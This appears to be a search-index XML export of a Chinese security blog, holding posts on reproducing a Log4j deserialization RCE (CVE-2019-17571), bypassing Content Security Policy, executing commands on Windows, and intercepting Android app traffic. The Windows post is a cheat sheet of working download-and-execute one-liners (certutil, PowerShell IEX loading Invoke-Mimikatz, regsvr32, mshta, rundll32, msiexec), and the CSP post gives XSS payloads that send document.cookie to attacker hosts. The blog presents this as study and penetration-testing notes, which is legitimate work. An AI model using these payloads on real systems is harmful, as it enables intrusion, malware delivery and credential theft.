<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Apache ActiveMQ Log4j远程代码执行漏洞复现学习]]></title>
    <url>%2F2020%2F01%2F07%2FAMQ-7370%2F</url>
    <content type="text"><![CDATA[前言前几天log4j1.2.17版本以下爆出存在对socket传入的序列化数据直接反序列化，从而对如果引入了存在漏洞的jar包就能进行rce攻击。刚好看到AMQ 5.15.10 / 5.15.11爆出Log4j存在远程代码执行漏洞，因此学习一波。 复现首先下载受影响AMQ版本：http://activemq.apache.org/activemq-51511-release这里有个小坑，我下载后运行activemq由于系统升级了macOS Catalina 出现下图报错：经过查找解决方式，发现网上也木有，但是可以直接通过brew install activemq 下载activemq-5.15.10版本。且可以运行： 然后使用ysoserial生成恶意序列化数据通过nc发送给61616端口即可看到dnslog信息： 修复：]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>CVE-2019-17571</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[log4j小于1.2.17 Deserialization vulnerability]]></title>
    <url>%2F2019%2F12%2F26%2Flog4j%E5%B0%8F%E4%BA%8E1.2.17%20Deserialization%20vulnerability%2F</url>
    <content type="text"><![CDATA[PS: 文章仅用于研究漏洞原理,学习技术,禁止用于非法用途，否则后果自负!!! 前言Apache Log4j是美国阿帕奇（Apache）软件基金会的一款基于Java的开源日志记录工具。本次出现漏洞就是因为log4j在启动套接口服务器后，对监听端口传入的反序列化数据没有进行过滤而造成的。 分析当log4j启动套接字服务器时，会监听命令行传入的端口。然后创建一个SocketNode类的对象来对端口接收到的数据进行处理。在对象初始化时,将端口接收到的数据封装为一个Object流对象。在run()方法中直接调用readObject()进行反序列化操作。因此只要运行的log4j有可以利用的Gadget就可以执行命令了。 复现下载commons-collections-3.1.jar,log4j-1.2.17.jar将commons-collections-3.1.jar加入到log4j的classpath中,然后启动：1java -cp &quot;log4j-1.2.17.jar:commons-collections-3.1.jar&quot; org.apache.log4j.net.SocketServer 4560 /Users/sunu11/Downloads/apache-log4j-1.2.17/examples/lf5/InitUsingLog4JProperties/log4j.properties /Users/sunu11/Downloads/apache-log4j-1.2.17 然后直接使用ysoserial生成恶意序列化数据通过nc发送给4560端口即可看到漏洞触发，命令执行1▶ java -jar ysoserial-master-v0.0.5-gb617b7b-16.jar CommonsCollections5 &quot;curl 127.0.0.1:9900&quot; | nc 127.0.0.1 4560 修复建议Apache官方已在新版本修复了该漏洞，Apache Log4j 1.2 版本官方已于2015年8月停止维护，建议升级到 2.8.2 或更高版本 参考：https://mp.weixin.qq.com/s/RLvvzKbBwKp-War98pvn9whttps://mp.weixin.qq.com/s/okU2y0izfnKXXtXG3EfLkQ感谢c0ny1大佬与清水川崎大佬指点]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>CVE-2019-17571</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[learning_CSP]]></title>
    <url>%2F2019%2F12%2F13%2Flearning-CSP%2F</url>
    <content type="text"><![CDATA[前言由于最近被问到CSP绕过的一些技巧，平时虽然在XSS漏洞挖掘、jsonp劫持漏洞挖掘中也有所接触，但感觉不够清晰，因此从头学习一波。希望大家也能通过本文有所了解。在挖洞遇到CSP策略拦截的时候能够参考绕过。 什么是CSPCSP全称Content Security Policy ,可以直接翻译为内容安全策略,就是为了页面内容安全而制定的一系列防护策略. 通过CSP所约束的的规则指定可信的内容来源（这里的内容可以指脚本、图片、iframe、fton、style等等可能的远程资源）。举个例子：我们经常可以在http头中看到下面头信息：1Content-Security-Policy: default-src &apos;self&apos; www.sunu11.com; script-src &apos;unsafe-inline&apos; 或者在页面中看到：1&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &apos;self&apos; www.sunu11.com; script-src &apos;unsafe-inline&apos;&quot;&gt; 这两种表达的含义一致，代表了默认信任同源和www.sunu11.com的资源,页面中允许执行javascript，允许使用内联资源如&lt;script&gt;标签、事件监听函数。它通过两组策略进行规定，每组策略包含一个策略指令和一个内容源列表 那下面简单介绍一下常用的策略指令：default-srcdefault-src 指令定义了那些没有被更精确指令指定的安全策略。这些指令包括： child-src 指定定义了 web workers 以及嵌套的浏览上下文（如&lt;frame&gt;和&lt;iframe&gt;）的源 connect-src 定义了请求、XMLHttpRequest、WebSocket 和 EventSource 的连接来源 font-src 定义了字体加载的有效来源 img-src 定义了图片或者图标加载的有效来源 media-src 定义了媒体文件加载的有效来源如HTML6的 &lt;audio&gt;, &lt;video&gt;等元素 object-src 定义页面插件的过滤策略,如 &lt;object&gt;, &lt;embed&gt;或者&lt;applet&gt;等元素 script-src 定义页面中javascript有效来源，它可以设置一些特殊值，如nonce（每次http回应给出一个授权token并内嵌脚本必须有token才会被执行）、hash（列出允许执行的脚本代码的hash值，在hash相吻合下才能执行内嵌脚本） style-src 定义页面中CSS样式的有效来源 那啥是内容源呢：内容源分三种：源列表、关键字与数据源列表是一个字符串,主要是指定主机或者域名，包括对应端口。可以用*来代表通配符：如： http://*.sunu11.com sunu11.com:8080 https://vpn.sunu11.com 关键字主要有以下几个： ‘none’ 空，不匹配任何URL ‘self’ 代表与文档同源，包括相同的URL协议和端口号。 ‘unsafe-inline’ 允许使用内联资源（javascript:URL、内联的事件处理函数与&lt;style&gt;、&lt;script&gt;元素）， ‘unsafe-eval’ 允许使用eval()等通过字符串创建代理的方法 使用 &#39;unsafe-inline&#39; 和 &#39;unsafe-eval&#39; 都是不安全的，它们会导致网站有跨站脚本攻击风险。 数据1234data: 允许data:URL作为内容来源mediastream: 允许mediastream:URL作为内容来源 如何绕过CSP限制下面总结了一些可能遇到CSP策略后bypass的方法： 可控的CRLF漏洞点当存在CRLF漏洞，且可控点在csp上方，可以通过注入回车换行符将CSP策略挤到返回体body部分，使其失效。注入成功后，可看到回显如下图所示： iframe绕过当同源站点同时存在多个页面，可以利用没有CSP保护页面的XSS漏洞窃取被保护页面的数据：比如A页面：1234&lt;html&gt;&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &apos;self&apos;; script-src &apos;self&apos;&quot;&gt;&lt;h1 test=“foo”&gt;A测试页面&lt;/h1&gt;&lt;/html&gt; B页面：12345678910&lt;html&gt;&lt;body&gt;&lt;script&gt;var iframe = document.createElement(‘iframe’);iframe.src=&quot;A页面&quot;;document.body.appendChild(iframe);setTimeout(()=&gt;alert(iframe.contentWindow.document.getElementById(&apos;foo&apos;).innerHTML),1000);&lt;/script&gt;&lt;/body&gt;&lt;!-- 模拟XSS获取A页面的foo,使用setTimeout是需要等待iframe加载完A页面--&gt;&lt;/html&gt; 当我们访问到B页面即可看到A测试页面被打印。 使用location.href由于CSP不会影响location.href跳转，我们可以通过构造运行如下js，将需要的数据打回vps上：location.href = &quot;vps_ip:xxxx?&quot;+document.cookie link标签此方法在老版本浏览器中可行，包括我们手里的xss_fuzz的字典应该也有很多使用link带外数据的payload：1234var link = document.createElement(&quot;link&quot;);link.setAttribute(&quot;rel&quot;, &quot;prefetch&quot;);link.setAttribute(&quot;href&quot;, &quot;//vps_ip/?&quot; + document.cookie);document.head.appendChild(link); 也有一种方法是将cookie作为子域名，用dns通道将cookie带出去。例如：123456789&lt;script&gt; dcl = document.cookie.split(&quot;;&quot;); n0 = document.getElementsByTagName(&quot;HEAD&quot;)[0]; for (var i=0; i&lt;dcl.length;i++) &#123; console.log(dcl[i]); n0.innerHTML = n0.innerHTML + &quot;&lt;link rel=&quot;dns-prefetch&quot; href=&quot;//&quot; + escape(dcl[i].replace(///g, &quot;-&quot;)).replace(/%/g, &quot;_&quot;) + &apos;.&apos; + location.hostname.replace(/./g, &quot;-&quot;) + &quot;.xxx.ceye.io&quot;&gt;&quot;; &#125;&lt;/script&gt; 这里要考虑到域名的命名规则是 [.-a-zA-Z0-9]+，所以需要对一些特殊字符进行替换,然后用ceye平台查看记录，替换特殊字符即可。 SVG绕过由于svg标签可以执行javascript脚本，如果页面中存在上传功能，并且没有过滤svg，那么可以通过上传恶意svg图像来xss.我们可以构造一个SVG文件，比如测试a.svg:123456&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;no&quot;?&gt;&lt;!DOCTYPE svg PUBLIC &quot;-//W3C//DTD SVG 1.1//EN&quot; &quot;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&quot;&gt;&lt;svg version=&quot;1.1&quot; id=&quot;Layer_1&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; x=&quot;0px&quot; y=&quot;0px&quot; width=&quot;100px&quot; height=&quot;100px&quot; viewBox=&quot;0 0 751 751&quot; enable-background=&quot;new 0 0 751 751&quot; xml:space=&quot;preserve&quot;&gt; &lt;image id=&quot;image0&quot; width=&quot;751&quot; height=&quot;751&quot; x=&quot;0&quot; y=&quot;0&quot; href=&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAu8AAALvCAIAAABa4bwGAAAAIGNIUk0AAHomAACAhAAA+gAAAIDo&quot; /&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/svg&gt; Base-uri绕过当服务器CSP策略script-src设置了nonce时，如果只设置了default-src没有额外设置base-uri。就可以使用&lt;base&gt;标签使当前页面上下文为自己vps地址。如果页面中script标签采用了相对路径，最终加载的js就是针对base标签中指定url的相对路径.exp：123&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &apos;self&apos;; script-src &apos;nonce-test&apos;&quot;&gt;&lt;base href=&quot;//vps_ip:prot/&quot;&gt;&lt;script nonce=&apos;test&apos; src=&quot;2.js&quot;&gt;&lt;/script&gt; 我这边2.js没写内容，但可以看到成功引入。此方法仅限页面引用存在相对路径的&lt;script&gt;标签以及上述两个条件。 JSONP绕过CSP在回调函数中包装js对象的jsonp接口通常允许第三方域的脚本作为源数据来加载api数据例如&lt;CSP设置为default-src &#39;self&#39; ，且存在json_data.php存在可控jsonp&gt;test.php1234&lt;?phpheader(&quot;Content-Security-Policy: default-src &apos;self&apos; script-src &apos;self&apos; &quot;);echo $_GET[&apos;foo&apos;];?&gt; json_data.php123456&lt;?phpsetcookie(&apos;password&apos;,&apos;1qaz@WSX&apos;);header(&apos;Content-type: application/javascript&apos;);$callback = $_GET[&apos;callback&apos;];$data = &quot;&#123;&apos;name&apos;:&apos;sunu11&apos;&#125;&quot;;echo $callback . &quot;(&quot; . json_encode($data) . &quot;)&quot;; exp:1http://127.0.0.1:8080/test.php?foo=%3Cscript%20src=%22http://127.0.0.1:8080/json_data.php?callback=alert(document.cookie)%22%20%3E%3C/script%3E 另外一些存在用户可控资源或jsonp较常用站点的github项目：https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/jsonp.js#L32-L180 利用浏览器补全绕过nonce：如果存在CSP策略需要绕过进行XSS：&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &#39;self&#39;; script-src &#39;nonce-foo&#39;&quot;&gt; 我们测试代码如下: 123456&lt;?php header(&quot;X-XSS-Protection:0&quot;);?&gt;&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &apos;self&apos;; script-src &apos;nonce-foo&apos;&quot;&gt;&lt;?php echo $_GET[&apos;foo&apos;]?&gt;&lt;script nonce=&apos;foo&apos;&gt;&lt;!-- test --&gt;&lt;/script&gt; 由于CSP 配置有nonce-foo，且在接受foo穿参后就有nonce=‘foo’，因此考虑插入&lt;script src=data:text/php,alert(1),让&lt;script nonce=&#39;foo&#39;&gt;前面的&lt;不被解析，而利用页面原有的nonce=&#39;foo’进行绕过。xss语句可构造为： CDN bypass在oragne大佬挖掘HackMD所存在的xss过程中，绕过CSP时发现HackMD给出的CSP信任名单有一个https://cdnjs.cloudflare.com/,这个cdn提供了许多第三方示例库以供引入，因此可以通过AngularJS的模板注入引入js。Exp:123456&lt;script src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.min.js&gt;&lt;/script&gt;&lt;div ng-app&gt; &#123;&#123;constructor.constructor(&apos;alert(document.cookie)&apos;)()&#125;&#125;&lt;/div&gt;//sssss&quot; --&gt; 具体分析文章可以参考:https://paper.seebug.org/855/ 可控静态资源如果站点存在CSP策略限制，但受限站点有可控的静态资源，我们可以利用可控的静态资源来完成。例如K1tten在 Review CodiMD 的Repo后发现的一处stored xss漏洞，也具有CSP限制。但他们通过找到www.google-analytics.com中提供的自定义javascript功能，再加上CSP 策略在同时有www.google-analytics.com以及 unsafe-eval这样的配置下可以执行任意JavaScript。因此可以绕过CSP的限制执行xss。具体过程可以参考K1tten的wp:https://github.com/k1tten/writeups/blob/master/bugbounty_writeup/HackMD_XSS_%26_Bypass_CSP.md 使用PDFxss绕过object-src在CSP标准里，object-src是限制插件的src，但js并不受限制。因此我们也可以尝试通过提交pdf文件来引入js，导致客户端的弹窗与URL跳转。&lt;embed width=&quot;100%&quot; height=&quot;100%&quot; src=&quot;//vps_ip/xxx.pdf&quot;&gt;&lt;/embed&gt; 补充总结考虑到上述多次提到同源策略，最后补充一下啥是同源策略：同源策略是浏览器的一个安全功能，不同源的客户端脚本在没有明确授权的情况下，不能读写对方资源。那什么是同源呢：端口相同、域名相同、协议相同的站点就是同源站点。举个例子：相对我的站点：http://sunu11.com/foo/foo.php以下站点是否同源：1234https://sunu11.com/foo/foo.php 不同源 http://sunu11.com:8080/foo/foo.php 不同源http://vpn.sunu11.com/foo/foo.php 不同源http://sunu11.com/foo/foo.php 同源 最后贴上重学CSP所参考的一些文章： https://inside.pixiv.blog/kobo/5137https://www.nccgroup.trust/us/about-us/newsroom-and-events/blog/2019/april/a-novel-csp-bypass-using-data-uri/https://developer.mozilla.org/zh-CN/docs/Web/Security/CSP/CSP_policy_directives 内容比较基础，文中有描述错误欢迎斧正，有更好案例的希望能够py。感谢浏览至此。]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>bypass</tag>
        <tag>前端安全</tag>
        <tag>CSP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[免杀]]></title>
    <url>%2F2019%2F09%2F05%2FTrojans_avoid_killing%2F</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title><![CDATA[windows下命令执行]]></title>
    <url>%2F2019%2F09%2F02%2FCommand%20execution%20under%20windows%2F</url>
    <content type="text"><![CDATA[背景：很多RCE漏洞均能有效在靶机中执行命令，但存在服务器可出网与不可出网的区别。对windows服务器而言，如果能出网。我们利用RCE获取服务器shell的方式都离不开上传shellcode到靶机上,而其可使用姿势收集整理如下： 方式certutil123证书服务的一部分，可用来下载木马。certutil -urlcache -split -f http://x.x.x.x/msf a.exe &amp;&amp; a.execertutil.exe -urlcache -split -f http://x.x.x.x/x.jar &amp;&amp;java -jar x.jar powershell12345678910a)、powershell -exec bypass -c (new-object System.Net.WebClient).DownloadFile(&apos;http://x/1.jpg‘,&apos;C:\Users\x\Desktop\test\12.exe&apos;)b)、powershell (Invoke-WebRequest http://x/1.jpg -O x.jpg)c)、也可以通过从UVC读取脚本执行：powershell -exec bypass -f \\webdavserver\a.ps1d)、内存加载：1、powershell IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&apos;); Invoke-Mimikatz2、powershell -exec bypass -c &quot;iwr https://gist.githubusercontent.com/Urahara3389/d83b6f9ccedf9aa53f70d987360dbc0e/raw/53ad790f87e0fd2c9449d5359358cd251c39297a/calc.ps1|iex&quot;powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&apos;cs shellcode address&apos;))&quot; bitsadmin123bitsadmin 可用于创建下载或上传工作和监测其进展情况。不支持https、ftp协议。bitsadmin /TRANSFER /DOWNLOAD http://x.x.x.x/a C:\tmp\1 下载文件到靶机中bitsadmin /TRANSFER /UPLOAD D:\\1.ps \\共享目录\folder\xx 上传到共享目录（未测试） CScript/WScript12345678两种方式，第一种直接执行UNC路径下的文件：cscript //E:jscript \\webdavserver\folder\payload.txt第二种分两步先写入脚本后调用：a)echo set a=createobject(^&quot;adod^&quot;+^&quot;b.stream^&quot;):set w=createobject(^&quot;micro^&quot;+^&quot;soft.xmlhttp^&quot;):w.open ^&quot;get^&quot;,wsh.arguments(0),0:w.send:a.type=1:a.open:a.write w.responsebody:a.savetofile wsh.arguments(1),2 &gt;&gt; c:\windows\temp\d.vbsb)cscript C:\Windows\Temp\d.vbs http://x.x.x.x/a C:\Windows\Temp\1.exe CSC123456该方式也是通过先写入具有下载功能的c语言程序，通过csc打包成exe，再通过该exe下载1、echo using System.Net;class WebDL &#123; static void Main(string[] args)&#123;System.Net.WebClient client = new WebClient();client.DownloadFile(args[0],args[1]);&#125;&#125; &gt; c:\windows\temp\svhost.cs2、找到csc的所在目录，然后调用编译cs文件：C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc /out:c:\windows\temp\svhost.exe C:\Windows\Temp\svhost.cs3、使用svhost.exe执行下载c:\windows\temp\dl.exe http://xx/a.sh c:\windows\temp\a.sh FTP12345先将要执行的命令写入到ftp.txt，再使用ftp -s:ftp.txt执行文本中的命令ftp.txt:open xx.x.x.x 21GET xxx.exequit JScript1、写入以下文件执行即可a.js:123456789101112var Object = WScript.CreateObject(&quot;MSXML2.XMLHTTP&quot;);Object.open(&quot;GET&quot;,&quot;http://x/a&quot;,false);Object.send();if (Object.Status == 200)&#123;var Stream = WScript.CreateObject(&quot;ADODB.Stream&quot;);Stream.Open();Stream.Type = 1;Stream.Write(Object.ResponseBody);Stream.SaveToFile(&quot;C:\\Users\\x\\Desktop\\test\\212.exe&quot;, 2);Stream.Close();&#125; regsvr321234567891011121314151617181920regsvr32 /u /s /i:http://site.com/a.png scrobj.dll远程加载a.png:&lt;?XML version=&quot;1.0&quot;?&gt;&lt;scriptlet&gt;&lt;registration progid=&quot;ShortJSRAT&quot; classid=&quot;&#123;10001111-0000-0000-0000-0000FEEDACDC&#125;&quot; &gt; &lt;!-- Learn from Casey Smith @subTee --&gt; &lt;script language=&quot;JScript&quot;&gt; &lt;![CDATA[ ps = &quot;ps script&quot;; new ActiveXObject(&quot;WScript.Shell&quot;).Run(ps,0,true); ]]&gt;&lt;/script&gt;&lt;/registration&gt;&lt;/scriptlet&gt; mshta12345678910111213141516171819202122mshta接受URL作为一个参数来执行HTA1） mshta http://xxxx.com/test.hta使用 mshta \\webdavserver\folder\payload.hta 还可隐藏mshta.exe所下载的内容。Msht具有执行内联脚本的能力，它将下载并执行一个脚本作为有效负载:2） mshta vbscript:Close(Execute(&quot;GetObject(&quot;&quot;script:http://xxxxx.com/payload.sct&quot;&quot;)&quot;))test.hta:&lt;HTML&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt;&lt;HEAD&gt; &lt;script language=&quot;VBScript&quot;&gt;Window.ReSizeTo 0, 0Window.moveTo -2000,-2000Set objShell = CreateObject(&quot;Wscript.Shell&quot;)objShell.Run &quot;xxx.exe&quot;self.close&lt;/script&gt;&lt;body&gt;demo&lt;/body&gt;&lt;/HEAD&gt; &lt;/HTML&gt; rundll32123rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();Object=new%20ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);Object.open(&quot;GET&quot;,&quot;http://reverse-tcp.xyz/test.exe&quot;,false);Object.send();if(Object.Status==200)&#123;Stream=new%20ActiveXObject(&quot;ADODB.Stream&quot;);Stream.Open();Stream.Type=1;Stream.Write(Object.ResponseBody);Stream.SaveToFile(&quot;E:\\test\\ssss2.exe&quot;,2);Stream.Close();&#125;rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();h=new%20ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);h.Open(&quot;GET&quot;,&quot;http://127.0.0.1:8081/connect&quot;,false);try&#123;h.Send();b=h.ResponseText;eval(b);&#125;catch(e)&#123;new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd /c taskkill /f /im rundll32.exe&quot;,0,true);&#125;% pubprn.vbs123pubprn.vbs是windows 7以后操作系统中存在的WSH脚本，它使用了GetObject()并且参数可控。cscript /b C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs 127.0.0.1 script:https://gist.githubusercontent.com/enigma0x3/64adf8ba99d4485c478b67e03ae6b04a/raw/a006a47e4075785016a62f7e5170ef36f5247cdb/test.sct详情可参考：https://enigma0x3.net/2017/08/03/wsh-injection-a-case-study/ winrm.vbs/slmgr.vbs12345678910111213141516171819使用该方式执行命令首先需要上传一个xsl文件，如下图所示：WsmPty.xsl:&lt;?xml version=&apos;1.0&apos;?&gt;&lt;stylesheetxmlns=&quot;http://www.w3.org/1999/XSL/Transform&quot; xmlns:ms=&quot;urn:schemas-microsoft-com:xslt&quot;xmlns:user=&quot;placeholder&quot;version=&quot;1.0&quot;&gt;&lt;output method=&quot;text&quot;&gt;&lt;/output&gt; &lt;ms:script implements-prefix=&quot;user&quot; language=&quot;JScript&quot;&gt; &lt;![CDATA[ var r = new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd.exe&quot;); ]]&gt; &lt;/ms:script&gt;&lt;/stylesheet&gt;在上传xsl文件之后，使用以下批处理文件进行启动：mkdir %SystemDrive%\可控目录copy %windir%\System32\cscript.exe %SystemDrive%\BypassDir%SystemDrive%\可控目录\cscript //nologo %windir%\System32\winrm.vbs get wmicimv2/Win32_Process?Handle=4 -format:pretty msiexec先通过msf生成msi木马文件，在使用该命令包含msi文件上线。(免杀是个关键问题)msiexec /q /i http://x/x.pngmsf生成msi格式即可，可重命名为pngmsfvenom -f msi xxx &gt; x,png IEExec1C:\Windows\Microsoft.NET\Framework64\v2.0.50727\IEExec.exe http://xx.x/a.exe Cmdcmd.exe /k &lt; \\webdavserver\1.txt 需要使用UNC/WebDAV服务器 Regasm/Regsvc12C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\webdavserver\1.dll需要使用UNC/WebDAV服务器 Msbuild1cmd /V /c &quot;set MB=&quot;C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe&quot; &amp; !MB! /noautoresponse /preprocess \\webdavserver\folder\x.xml &gt; x.xml &amp; !MB! x.xml&quot; pcalua.exepcalua.exe -a \\webdavserver\1.dll 需要使用UNC/WebDAV服务器 Cmstpcmstp.exe /ni /s c:\cmstp\CorpVPN.inf该方式未复现，先记录一下：https://www.anquanke.com/post/id/86685 MavInject3212查阅资料是使用以下命令将恶意dll文件注入到正常进程中执行：(测试未建立连接2333)C:\Windows\SysWOW64\mavinject.exe &lt;PID&gt; /INJECTRUNNING &lt;PATH DLL&gt; Odbcconf123两种加载恶意dll文件执行的方式，/F后可拼接任意后缀。odbcconf.exe /A &#123;REGSVR evil.dll&#125;odbcconf.exe / F odbcconf.config（可写一个任意后缀文件，里面内容加载获取shell的dll。如果文件未在odbcconf.exe目录下dll文件需有绝对路径。） 其他1、执行命令的方式可跟其他技术结合，因此总结该文又浮现一个大坑。 免杀问题。无论是打破边界获取入口点权限还是内网拓展、钓鱼攻击等等情况都对免杀有绝对依赖。 2、UNC/WebDAV路径利用相关文章：https://www.anquanke.com/post/id/86894 3、一个JS加载.Net程序的工具：DotNetToJScript https://www.4hou.com/tools/6171.html]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[解决android模拟器抓包环境问题]]></title>
    <url>%2F2019%2F03%2F31%2FAPP_capturing_packets%2F</url>
    <content type="text"><![CDATA[前言无论是日常渗透测试还是在做红蓝对抗，或者甲方自查风险，手机端的暴露面都是不可忽视的一部分。这里就涉及到一个很关键的模块，如何抓到app客户端与服务端的交互数据包。从防御方法上来讲，我所了解到的主要有以下几个情况： 1、远古时期，无ssl证书，明文传输数据。2、采用ssl证书加密，但未使用做ssl Pining技术3、采用ssl证书加密，但使用了ssl pining技术。4、双向加密 而对于上述几种情况的抓包，第一种，几乎遇不到了，忽略2333.第二种则需要根据android版本以及app的版本号来确定抓包方法，在这贴一下android版本中微信信任证书的情况作为示例：安卓系统 7.0 以下版本，都会信任系统提供的证书安卓系统 7.0 以上版本，微信 7.0 以下版本，微信会信任系统提供的证书安卓系统 7.0 以上版本，微信 7.0 以上版本，微信只信任它自己配置的证书列表 经历与经验下面就简单记录一下抓取app数据包的过程。个人比较喜欢使用burpsuite，因此做了以下尝试： 方案1:1、下载网易mumu模拟器并安装。地址：http://a11.gdl.netease.com/nemu-2.0.23-1101153315.exe模拟器2:腾讯网游助手（该模拟器微信不会被检测，但mac下经测试，某些app存在秒退现象）：地址：https://syzs.qq.com/ 2、将burp证书用openssl将DER转换为PEM，然后输出subject_hash_old值并重命名该文件：命令如下：1234▶ openssl x509 -inform DER -in /Users/sunu11/Downloads/cacert.der -out cacert.pem▶ openssl x509 -inform PEM -subject_hash_old -in cacert.pem|head -1get hashmv cacert.pem &lt;hash&gt;.0 3、下载adb http://adbshell.com/downloads ，连接模拟器，将证书传入系统证书文件夹下：1234567891011adb devicesadb connect 127.0.0.1:6555adb rootadb remount //重新挂载为可写adb push 9a5ba575.0 /sdcard/adb connect 127.0.0.1:7555adb shellcat /sdcard/9a5ba575.0 &gt; /system/etc/security/cacerts/9a5ba575.0 //此处由于网易mumu共享文件夹中文编码在cmd中显示存在问题，无法直接mvchmod 644 /system/etc/security/cacerts/9a5ba575.0 //修改权限为644 然后重启模拟器，在受信任的凭据处即可看到burp的证书已经添加至系统证书下： 4、挂代理，抓包即可，基本上微信公众号，app、浏览器等数据包都可监听。 由于mac上模拟器存在各种原因，因此转向使用测试实体机。 方案2:我找了个老魅族手机(推荐闲鱼）android5.1，直接安装burp证书，设置代理即可抓取未采用ssl Pining防止中间人的app数据包。但如果存在ssl Pining防护，则需要借助xposed+justTrustMe模块，将所有用于校验SSL证书的API都进行Hook，从而绕过证书检查的方式来进行抓包，而在这个过程中，其实是与android版本没有太大关系。 下面记录一下之前刷pxeil装xp失败的经历：听朋友说谷歌的pxeil跟nexus好刷机，因此闲鱼淘了个pxeil手机。要求root+xp框架，忘了说版本号了，给我寄过来的是android9的。本来是装好了xp框架的，但是安装justTrustMe模块后，发现可以解密抓到部分https数据包，但无法抓到一个验证码的包，导致无法正常使用app功能。以为是xp问题，但后续证明并非如此，且原因未知。在发现无法抓取整个数据包后，尝试降低android版本，听朋友说8.1有刷成功，就刷8.1的安卓包。 123456789101112131415161718192021刷机必须解锁，也就是说能够进入bl界面，像华为这种，无法解锁的目前我也不知道怎么刷机。下载镜像包后解压到platform-tools目录。adb reboot bootloader进入镜像包解压目录。./flash-all.sh到这里基本上重启系统就更替完成了，但是由于我们想获取root权限，就需要安装一些其他软件，比如magisk、superSu等。这就需要用到下一步：。重启刷入twrp(有些情况img与zip都需要刷入，twrp是第三方recovery环境，可以刷任意系统扩展包）下载地址(能用最新的就用，老的也有可能有bug)：https://dl.twrp.me/sailfish/adb reboot bootloaderfastboot boot twrp-3.3为了避免其他bug，先重启一波再进入rec然后安装magisk（获取root权限）https://github.com/topjohnwu/Magisk/releases/download/v20.1/Magisk-v20.1.zip在安装好之后，重启进入系统。magisk工具也有一个插件MagiskTrustUserCerts，这个装上之后，也能抓取某些app没有使用ssl Pining技术的数据包。然后再安装xp框架。这里两种方式：1、在coolapk.com安装xposed installer，安装好apk后，进入软件。用梯子直接下载。2、在下面链接下载xposed进入rec刷入系统：https://dl-xda.xposed.info/framework/sdk27/arm64/xposed-v90-sdk27-arm64-beta3.zip 我自己先尝试的pxeil手机，在最后用coolapk安装xposed由于没有vpn，安装没成功，但是学弟翻墙后一键安装成功了：如图：然后我尝试进rec刷，一直爆错，因此更换成nexus5了。但是查资料有发现V2EX上有网上也有一种报错的解决方案https://www.v2ex.com/t/396476。说是用Flashfire可以刷成功，但是我记得迷迷糊糊有成功过一回，但是照样抓包不完全，遂弃之～ 方案3:对于双向证书校验一般情况抓包都会报错，原因在于服务器也会对客户端的证书进行验证，不通过则拒绝连接。因此在确定app是采用双向认证后，我们就需要获取服务端匹配的证书，用它对服务端进行匹配。由于我本人没有实际对双向认证的app进行过抓包，但是通过学习安全客的这篇文章发现思路还是不难：https://www.anquanke.com/post/id/190080由于app采用双向认证，那客户端肯定能找到其证书文件，在获取到证书文件后，需要找到其安装密码.在这一步有可能涉及到脱壳的知识，本文不做过多描述，在脱壳后用IDA加载二进制文件，在String窗口搜索证书的相关内容，追到证书密钥即可。然后再通过密钥在本机安装好证书：用burp添加客户端证书:然后选中该证书进行抓包即可。 在尝试用pxeil去抓https的数据包，一直不想放弃，恶心了好几天。后来发现确实有可能不是操作问题后选择了换机器2333，以下是过程中的一些体会： 1、其实，在过程中，有同事可以在windows系统上使用夜神抓取app的数据包，经过查看确实也是采用xp+justTrustMe模块。 2、由于xp官方仅仅支持到android8.1，后续推荐使用类xp框架太极。网上是有使用太极替代xp的例子。当然有有xp支持android9，不过需要安装魔图，而我第一次购买的二手机则是用的这种姿势，貌似那个验证码是tx的，抓包就卡在获取验证码处，因此放弃高版本android型号。 3、钱还是个好东西，朋友用的iphone(越狱)，直接使用charles安装证书后就顺利抓到了ios端app的数据包。 补充其实除了上面的方法，还有其他的很多思路，下面仅作记录，方便以后查阅：1、有网友提出另一种抓包方式抓取微信PC端的流量，类似内网渗透中代理内网流量，在SocksCap64中设置代理服务器为burp的地址和端口，代理方式HTTP.然后设置微信走socksCap64代理。通过burpsuite抓包即可。—这种思路某些情况下没能成功23333. 